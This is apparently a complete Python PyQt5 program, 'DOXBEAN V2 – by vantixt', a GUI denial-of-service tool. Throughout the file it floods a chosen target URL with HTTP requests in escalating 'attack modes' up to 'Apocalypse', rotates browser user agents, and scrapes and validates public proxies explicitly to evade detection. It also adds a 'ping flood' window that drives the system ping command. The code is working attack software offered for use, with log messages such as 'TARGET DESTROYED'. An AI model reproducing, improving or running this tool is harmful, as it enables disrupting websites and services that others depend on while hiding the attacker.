import sys
import requests
import random
import threading
import subprocess
import platform
import time
import concurrent.futures
import json
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication,
    QMainWindow,
    QVBoxLayout,
    QWidget,
    QLabel,
    QLineEdit,
    QPushButton,
    QTextEdit,
    QCheckBox,
    QComboBox,
    QProgressBar,
    QAction,
    QMenuBar,
    QDialog,
    QHBoxLayout,
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QPixmap

COLOR_BACKGROUND = '#000000'
COLOR_FOREGROUND_MAIN_WINDOW = '#FFFFFF'
COLOR_LABELS_BORDERS = '#FF0000'
COLOR_INPUT_BACKGROUND = '#111111'
COLOR_INPUT_TEXT = '#FF0000'
COLOR_LOG_TEXT = '#FF3333'
COLOR_BUTTON_BACKGROUND = '#330000'
COLOR_BUTTON_TEXT = '#FFFFFF'
COLOR_BUTTON_BORDER = '#FF0000'
COLOR_ERROR_BORDER = '#FF0000'
COLOR_CREDIT_TEXT = '#FF3333'
APP_IMAGE_URL = 'https://l.top4top.io/p_3462agwc11.png'
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.142 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.142 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.142 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:126.0) Gecko/20100101 Firefox/126.0',
]
PROXY_APIS = [
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all',
    'https://openproxy.space/list/http',
    'https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc',
    'https://www.proxy-list.download/api/v1/get?type=http',
    'http://pubproxy.com/api/proxy?limit=5&format=json&type=http',
    'https://api.getproxylist.com/v1/proxy/random?type=http',
    'https://proxy11.com/api/proxy-list?type=http',
]

def scrape_proxies():
    proxies = []
    for api in PROXY_APIS:
        try:
            response = requests.get(api, timeout=10)
            if response.status_code == 200:
                if api == 'https://openproxy.space/list/http':
                    lines = response.text.splitlines()
                    for line in lines[1:]:
                        parts = line.split()
                        if len(parts) >= 2:
                            ip, port = parts[0], parts[1]
                            proxies.append(f'{ip}:{port}')
                elif api.startswith('http://pubproxy.com') or api.startswith('https://api.getproxylist.com'):
                    data = json.loads(response.text)
                    proxy_list = data.get('data', []) if api.startswith('http://pubproxy.com') else [data]
                    for proxy in proxy_list:
                        if 'ip' in proxy and 'port' in proxy:
                            proxies.append(f"{proxy['ip']}:{proxy['port']}")
                else:
                    data = response.text.splitlines()
                    for proxy in data:
                        if ':' in proxy and proxy.strip():
                            proxies.append(proxy.strip())
        except Exception as e:
            print(f'Error fetching proxies from {api}: {e}')
    return proxies

def validate_proxy(proxy, timeout=2):
    try:
        response = requests.get(
            'http://example.com',
            proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'},
            timeout=timeout,
        )
        return response.status_code == 200
    except:
        return False

class AttackThread(QThread):
    log_signal = pyqtSignal(str)
    update_progress = pyqtSignal(int)

    def __init__(self, url, num_requests, attack_mode, use_proxy):
        super().__init__()
        self.url = url
        self.num_requests = num_requests
        self.attack_mode = attack_mode
        self.use_proxy = use_proxy
        self.proxies = []
        self.valid_proxies = []
        self.running = True
        self.current_requests_sent = 0
        self.sessions = [self.create_session() for _ in range(8)]
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=30)

    def create_session(self):
        session = requests.Session()
        session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        return session

    def run(self):
        self.log_signal.emit(f'DOXBEAN V2 ACTIVATED! TARGET LOCKED! MODE: {self.attack_mode}')
        if self.use_proxy:
            self.log_signal.emit('Fetching proxies from APIs in background...')
            proxy_thread = threading.Thread(target=self.load_and_validate_proxies)
            proxy_thread.daemon = True
            proxy_thread.start()
        batch_config = {
            'Stealth': {'size': 1, 'delay': 0.5, 'timeout': 4},
            'Rage': {'size': 1, 'delay': 0.3, 'timeout': 3},
            'Overkill': {'size': 1, 'delay': 0.15, 'timeout': 2},
            'Apocalypse': {'size': 1, 'delay': 0.05, 'timeout': 1.5},
        }
        config = batch_config.get(self.attack_mode, {'size': 1, 'delay': 0.3, 'timeout': 3})
        futures = []
        for i in range(self.num_requests):
            if not self.running:
                break
            try:
                proxy = None
                if self.use_proxy and self.valid_proxies:
                    proxy = random.choice(self.valid_proxies)
                futures.append(
                    self.executor.submit(
                        self.send_request, random.choice(self.sessions), proxy, config['timeout']
                    )
                )
                self.current_requests_sent += 1
                log_msg = f"[{datetime.now().strftime('%H:%M:%S')}] Sent {self.current_requests_sent}/{self.num_requests} requests (Mode: {self.attack_mode})"
                self.log_signal.emit(log_msg)
                self.update_progress.emit(
                    int((self.current_requests_sent / self.num_requests) * 100)
                )
                time.sleep(config['delay'])
            except Exception as e:
                self.log_signal.emit(f'Request error: {str(e)}')
        concurrent.futures.wait(futures, timeout=1)
        if self.running:
            self.log_signal.emit('\nDOXBEAN V2 COMPLETE. TARGET DESTROYED.')
        self.update_progress.emit(0)
        self.executor.shutdown(wait=False)

    def load_and_validate_proxies(self):
        proxies = scrape_proxies()
        if not proxies:
            self.log_signal.emit('No proxies found.')
            return
        self.log_signal.emit(f'Found {len(proxies)} proxies. Validating in background...')
        for proxy in proxies:
            if validate_proxy(proxy, timeout=2):
                self.valid_proxies.append(proxy)
        self.log_signal.emit(f'Validated {len(self.valid_proxies)} working proxies.')

    def send_request(self, session, proxy, timeout):
        try:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None
            session.get(self.url, proxies=proxies, timeout=timeout, allow_redirects=True)
        except Exception:
            return None

    def stop(self):
        self.running = False
        self.executor.shutdown(wait=False)
        self.log_signal.emit('\nDOXBEAN V2 HALTED BY USER. TARGET IS ALREADY GONE.')

class PingWorker(QThread):
    output = pyqtSignal(str)
    error = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self, target, count):
        super().__init__()
        self.target = target
        self.count = count
        self._is_running = True

    def run(self):
        try:
            clean_target = self.target.replace('https://', '').replace('http://', '').split('/')[0]
            if platform.system().lower() == 'windows':
                command = ['ping', '-n', str(self.count), clean_target]
            else:
                command = ['ping', '-c', str(self.count), clean_target]
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                encoding='utf-8',
                errors='replace',
            )
            while self._is_running:
                output_line = process.stdout.readline()
                if output_line == '' and process.poll() is not None:
                    break
                if output_line:
                    self.output.emit(output_line.strip())
            return_code = process.poll()
            if return_code != 0:
                error_output = process.stderr.read()
                if error_output:
                    self.error.emit(f'Ping failed: {error_output.strip()}')
        except Exception as e:
            self.error.emit(f'Fatal error: {str(e)}')
        finally:
            self.finished.emit()

    def stop(self):
        self._is_running = False

class PingWindow(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('DOXBEAN V2 – PINGER')
        self.setGeometry(300, 300, 600, 400)
        self.setStyleSheet(
            '''
            QDialog {
                background-color: #121212;
                color: #FF0000;
                font-family: 'Consolas';
                font-size: 12px;
            }
            QLabel {
                color: #FF3333;
                font-weight: bold;
            }
            QLineEdit {
                background-color: #1E1E1E;
                color: #FF0000;
                border: 2px solid #FF0000;
                padding: 8px;
                border-radius: 4px;
            }
            QPushButton {
                background-color: #330000;
                color: #FFFFFF;
                border: 2px solid #FF0000;
                padding: 8px 15px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #FF0000;
                color: #000000;
            }
            QPushButton:pressed {
                background-color: #1E1E1E;
            }
            QTextEdit {
                background-color: #000000;
                color: #FF0000;
                border: 2px solid #FF0000;
                font-family: 'Consolas';
                font-size: 11px;
            }
        '''
        )
        layout = QVBoxLayout()
        title = QLabel('DOXBEAN V2 – PINGER')
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet('font-size: 24px; color: #FF0000; font-weight: bold;')
        layout.addWidget(title)
        input_layout = QHBoxLayout()
        self.target_label = QLabel('TARGET:')
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText('example.com or 8.8.8.8')
        self.count_label = QLabel('PINGS:')
        self.count_input = QLineEdit('1000')
        self.count_input.setFixedWidth(60)
        input_layout.addWidget(self.target_label)
        input_layout.addWidget(self.target_input)
        input_layout.addWidget(self.count_label)
        input_layout.addWidget(self.count_input)
        button_layout = QHBoxLayout()
        self.ping_button = QPushButton('UNLEASH PING FLOOD')
        self.ping_button.clicked.connect(self.start_ping)
        self.stop_button = QPushButton('STOP')
        self.stop_button.setEnabled(False)
        self.stop_button.clicked.connect(self.stop_ping)
        self.clear_button = QPushButton('CLEAR')
        self.clear_button.clicked.connect(self.clear_output)
        button_layout.addWidget(self.ping_button)
        button_layout.addWidget(self.stop_button)
        button_layout.addWidget(self.clear_button)
        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addLayout(input_layout)
        layout.addLayout(button_layout)
        layout.addWidget(self.output)
        self.setLayout(layout)
        self.worker = None
        self.thread = None

    def start_ping(self):
        target = self.target_input.text().strip()
        count = self.count_input.text().strip()
        if not target:
            self.output.append('ERROR: Enter a target (e.g., example.com)!')
            return
        try:
            count = int(count)
            if count <= 0:
                raise ValueError
        except ValueError:
            self.output.append('ERROR: Invalid ping count! Must be a positive number.')
            return
        self.output.clear()
        self.output.append(f'DOXBEAN V2 PING FLOOD STARTED: {target} ({count} pings)\n')
        self.ping_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.target_input.setEnabled(False)
        self.count_input.setEnabled(False)
        self.worker = PingWorker(target, count)
        self.thread = QThread()
        self.worker.moveToThread(self.thread)
        self.thread.started.connect(self.worker.run)
        self.worker.finished.connect(self.thread.quit)
        self.worker.finished.connect(self.worker.deleteLater)
        self.worker.output.connect(self.output.append)
        self.worker.error.connect(lambda msg: self.output.append(f'{msg}'))
        self.thread.finished.connect(self.on_ping_finished)
        self.thread.start()

    def stop_ping(self):
        if self.worker:
            self.worker.stop()
        self.output.append('\nDOXBEAN V2 PING FLOOD STOPPED BY USER')
        self.on_ping_finished()

    def on_ping_finished(self):
        self.ping_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.target_input.setEnabled(True)
        self.count_input.setEnabled(True)

    def clear_output(self):
        self.output.clear()

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('DOXBEAN V2 – by vantixt')
        self.setGeometry(200, 200, 700, 850)
        self.setStyleSheet(
            f'''
            QMainWindow {{
                background-color: {COLOR_BACKGROUND};
                color: {COLOR_FOREGROUND_MAIN_WINDOW};
                border: 1px solid {COLOR_LABELS_BORDERS};
                padding: 8px;
                font-family: 'Courier New';
            }}
            QLabel {{
                color: {COLOR_LABELS_BORDERS};
                font-family: 'Courier New';
                font-weight: bold;
            }}
            QLineEdit, QComboBox, QTextEdit {{
                background-color: {COLOR_INPUT_BACKGROUND};
                color: {COLOR_INPUT_TEXT};
                border: 1px solid {COLOR_LABELS_BORDERS};
                padding: 8px;
                border-radius: 4px;
            }}
            QPushButton {{
                background-color: {COLOR_BUTTON_BACKGROUND};
                color: {COLOR_BUTTON_TEXT};
                font-weight: bold;
                border: 2px solid {COLOR_BUTTON_BORDER};
                padding: 8px 15px;
                border-radius: 4px;
            }}
            QPushButton:hover {{
                background-color: {COLOR_BUTTON_BORDER};
            }}
            QPushButton:pressed {{
                background-color: {COLOR_BACKGROUND};
            }}
            QPushButton:disabled {{
                background-color: {COLOR_INPUT_BACKGROUND};
                color: #555555;
                border: 1px solid {COLOR_LABELS_BORDERS};
            }}
            QCheckBox {{
                color: {COLOR_LABELS_BORDERS};
                font-family: 'Courier New';
            }}
            QProgressBar {{
                border: 1px solid {COLOR_LABELS_BORDERS};
                border-radius: 5px;
                text-align: center;
                background-color: {COLOR_INPUT_BACKGROUND};
                color: {COLOR_LOG_TEXT};
            }}
            QProgressBar::chunk {{
                background-color: {COLOR_LABELS_BORDERS};
                border-radius: 5px;
            }}
        '''
        )
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout()
        menu_bar = self.menuBar()
        tools_menu = menu_bar.addMenu('Tools')
        ping_action = QAction('DOXBEAN V2 – Pinger', self)
        ping_action.triggered.connect(self.open_ping_window)
        tools_menu.addAction(ping_action)
        title = QLabel('DOXBEAN V2')
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet(f'font-size: 48px; color: {COLOR_LABELS_BORDERS};')
        layout.addWidget(title)
        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setFixedSize(350, 350)
        layout.addWidget(self.image_label, alignment=Qt.AlignCenter)
        self.credit_label = QLabel('')
        self.credit_label.setAlignment(Qt.AlignCenter)
        self.credit_label.setStyleSheet(f'color: {COLOR_CREDIT_TEXT}; font-size: 16px;')
        layout.addWidget(self.credit_label, alignment=Qt.AlignCenter)
        self.vantixt_label = QLabel('by vantixt')
        self.vantixt_label.setAlignment(Qt.AlignCenter)
        self.vantixt_label.setStyleSheet('color: #FFFFFF; font-size: 16px;')
        layout.addWidget(self.vantixt_label, alignment=Qt.AlignCenter)
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet(
            f'background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_LOG_TEXT}; border: 2px solid {COLOR_LABELS_BORDERS};'
        )
        layout.addWidget(self.log_output)
        self.load_image_from_url(APP_IMAGE_URL)
        self.url_label = QLabel('TARGET URL:')
        self.url_label.setStyleSheet(f'color: {COLOR_LABELS_BORDERS};')
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText('https://example.com')
        self.url_input.setStyleSheet(
            f'background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_INPUT_TEXT}; border: 1px solid {COLOR_LABELS_BORDERS};'
        )
        self.url_input.textChanged.connect(self.validate_url_input)
        layout.addWidget(self.url_label)
        layout.addWidget(self.url_input)
        self.requests_label = QLabel('NUMBER OF REQUESTS:')
        self.requests_label.setStyleSheet(f'color: {COLOR_LABELS_BORDERS};')
        self.requests_input = QLineEdit()
        self.requests_input.setPlaceholderText('1000000')
        self.requests_input.setStyleSheet(
            f'background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_INPUT_TEXT}; border: 1px solid {COLOR_LABELS_BORDERS};'
        )
        self.requests_input.textChanged.connect(self.validate_requests_input)
        layout.addWidget(self.requests_label)
        layout.addWidget(self.requests_input)
        self.mode_label = QLabel('ATTACK MODE:')
        self.mode_label.setStyleSheet(f'color: {COLOR_LABELS_BORDERS};')
        self.mode_selector = QComboBox()
        self.mode_selector.addItems(['Stealth', 'Rage', 'Overkill', 'Apocalypse'])
        self.mode_selector.setStyleSheet(
            f'background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_INPUT_TEXT}; border: 1px solid {COLOR_LABELS_BORDERS};'
        )
        layout.addWidget(self.mode_label)
        layout.addWidget(self.mode_selector)
        self.use_proxy = QCheckBox('AUTO-FETCH PROXIES (Evade Detection)')
        self.use_proxy.setStyleSheet(f'color: {COLOR_LABELS_BORDERS};')
        self.use_proxy.setChecked(True)
        layout.addWidget(self.use_proxy)
        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        layout.addWidget(self.progress_bar)
        self.start_button = QPushButton('UNLEASH DOXBEAN V2')
        self.start_button.setStyleSheet(
            f'background-color: {COLOR_BUTTON_BACKGROUND}; color: {COLOR_BUTTON_TEXT}; border: 2px solid {COLOR_BUTTON_BORDER};'
        )
        self.start_button.clicked.connect(self.start_attack)
        layout.addWidget(self.start_button)
        self.stop_button = QPushButton('ABORT MISSION')
        self.stop_button.setStyleSheet(
            f'background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_BUTTON_TEXT}; border: 2px solid {COLOR_LABELS_BORDERS};'
        )
        self.stop_button.setEnabled(False)
        self.stop_button.clicked.connect(self.stop_attack)
        layout.addWidget(self.stop_button)
        central_widget.setLayout(layout)
        self.attack_thread = None

    def open_ping_window(self):
        self.ping_window = PingWindow()
        self.ping_window.show()

    def load_image_from_url(self, url):
        try:
            response = requests.get(url, timeout=10)
            pixmap = QPixmap()
            pixmap.loadFromData(response.content)
            if not pixmap.isNull():
                self.image_label.setPixmap(
                    pixmap.scaled(350, 350, Qt.KeepAspectRatio, Qt.SmoothTransformation)
                )
                self.log_message('DOXBEAN V2 LOADED. READY FOR DESTRUCTION')
            else:
                self.log_message('Error: Could not load image!')
        except Exception as e:
            self.log_message(f'Error loading image: {str(e)}')

    def log_message(self, message):
        self.log_output.append(message)

    def validate_url_input(self):
        url = self.url_input.text().strip()
        if url.startswith('http://') or url.startswith('https://'):
            self.url_input.setStyleSheet(
                f'background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_INPUT_TEXT}; border: 1px solid {COLOR_LABELS_BORDERS};'
            )
        else:
            self.url_input.setStyleSheet(
                f'background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_INPUT_TEXT}; border: 1px solid {COLOR_ERROR_BORDER};'
            )

    def validate_requests_input(self):
        text = self.requests_input.text().strip()
        if text.isdigit() and int(text) > 0:
            self.requests_input.setStyleSheet(
                f'background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_INPUT_TEXT}; border: 1px solid {COLOR_LABELS_BORDERS};'
            )
        else:
            self.requests_input.setStyleSheet(
                f'background-color: {COLOR_INPUT_BACKGROUND}; color: {COLOR_INPUT_TEXT}; border: 1px solid {COLOR_ERROR_BORDER};'
            )

    def start_attack(self):
        url = self.url_input.text().strip()
        num_requests_str = self.requests_input.text().strip()
        if not url.startswith('http://') and not url.startswith('https://'):
            self.log_message('ERROR: Enter a valid target URL (e.g., https://example.com)!')
            return
        if not num_requests_str.isdigit() or int(num_requests_str) <= 0:
            self.log_message('ERROR: Invalid request count! Enter a positive number.')
            return
        num_requests = int(num_requests_str)
        attack_mode = self.mode_selector.currentText()
        use_proxy = self.use_proxy.isChecked()
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.url_input.setEnabled(False)
        self.requests_input.setEnabled(False)
        self.mode_selector.setEnabled(False)
        self.use_proxy.setEnabled(False)
        self.progress_bar.setValue(0)
        self.log_output.clear()
        self.log_message('UNLEASHING DOXBEAN V2 – by vantixt')
        self.attack_thread = AttackThread(url, num_requests, attack_mode, use_proxy)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.update_progress.connect(self.progress_bar.setValue)
        self.attack_thread.start()

    def stop_attack(self):
        if self.attack_thread and self.attack_thread.isRunning():
            self.attack_thread.stop()
            self.attack_thread.wait()
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.url_input.setEnabled(True)
        self.requests_input.setEnabled(True)
        self.mode_selector.setEnabled(True)
        self.use_proxy.setEnabled(True)
        self.log_message('DOXBEAN V2 STOPPED. TARGET IS IN RUINS.')

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())